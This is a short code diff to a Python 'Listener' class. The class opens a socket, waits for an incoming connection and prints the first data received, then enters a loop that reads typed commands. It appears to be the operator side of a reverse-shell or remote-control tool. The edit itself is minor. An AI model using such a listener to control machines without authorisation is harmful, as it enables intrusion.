@@ -6,11 +6,12 @@ class Listener:
         lport = int(input("     Port to listen to:"))
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((lhost, lport))
-        print("[*] Listening for Conections...\n")
+        print("[*] Listening for Conections...")
         s.listen()
         conn, addr = s.accept()
-
         print(f"[+] Connected to {addr}")
+        recieved_data = conn.recv(5000).decode()
+        print(recieved_data)
 
         while True:
             command = input(">>> ")
